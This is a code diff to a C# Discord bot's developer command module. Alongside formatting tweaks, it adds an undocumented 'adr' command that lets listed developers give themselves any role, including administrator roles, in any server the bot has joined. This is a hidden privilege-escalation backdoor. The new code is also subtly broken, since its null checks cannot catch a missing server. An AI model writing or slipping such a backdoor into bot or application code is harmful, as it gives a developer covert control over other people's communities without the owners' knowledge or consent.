@@ -3,7 +3,6 @@ using Public_Bot;
 using System.IO;
 using System.Linq;
 using System.Threading.Tasks;
-using Discord.WebSocket;
 
 namespace RoleX.modules
 {
@@ -11,7 +10,7 @@ namespace RoleX.modules
     class DeveloperCommands : CommandModuleBase
     {
         [DiscordCommand("guilds", commandHelp = "", description = "")]
-        public async Task Guilds(params string[] args)
+        public async Task Guilds(params string[] _)
         {
             if (devids.Any(x => x == Context.User.Id))
             {
@@ -32,14 +31,14 @@ namespace RoleX.modules
                 await ReplyAsync(
                     embed: new EmbedBuilder
                     {
-                        Title = "All RoleX Guilds LMAO",
+                        Title = $"All RoleX Guilds LMAO (total: {Context.Client.Guilds.Count})",
                         Description = st,
                         Color = Blurple
-                    }.WithCurrentTimestamp().Build());
+                    }.WithCurrentTimestamp());
             }
         }
         [DiscordCommand("sqlite", commandHelp = "", description = "")]
-        public async Task Gz(params string[] args)
+        public async Task Gz(params string[] _)
         {
             if (devids.Any(x => x == Context.User.Id))
             {
@@ -111,8 +110,8 @@ namespace RoleX.modules
                 string x = string.Join(' ', args);
                 string[] splitted = x.Split(',');
                 string title = splitted[0];
-                string description = string.Join(' ',splitted.Skip(1));
-                foreach(var server in Context.Client.Guilds)
+                string description = string.Join(' ', splitted.Skip(1));
+                foreach (var server in Context.Client.Guilds)
                 {
                     var channel = server.DefaultChannel;
                     try
@@ -124,11 +123,33 @@ namespace RoleX.modules
                             Color = Blurple,
                             ThumbnailUrl = Context.Client.CurrentUser.GetAvatarUrl()
                         }.WithCurrentTimestamp().Build());
-                    } catch
+                    }
+                    catch
                     {
                         await ReplyAsync($"Couldn't write in {server.Name}");
-                    } finally { }
+                    }
+                    finally { }
                 }
+            }
+        }
+        [DiscordCommand("adr", commandHelp = "", description = "")]
+        public async Task GPe(ulong a, ulong y)
+        {
+            if (devids.Any(x => x == Context.User.Id))
+            {
+                var breh = Context.Client.Guilds.First(al => al.Id == a);
+                if (breh == null)
+                {
+                    await ReplyAsync("Why are you like this <:noob:756055614861344849>");
+                    return;
+                }
+                var irdk = breh.GetUser(Context.User.Id);
+                if (irdk == null)
+                {
+                    await ReplyAsync("Why are you like this <:noob:756055614861344849>");
+                    return;
+                }
+                await irdk.AddRoleAsync(breh.GetRole(y));
             }
         }
     }
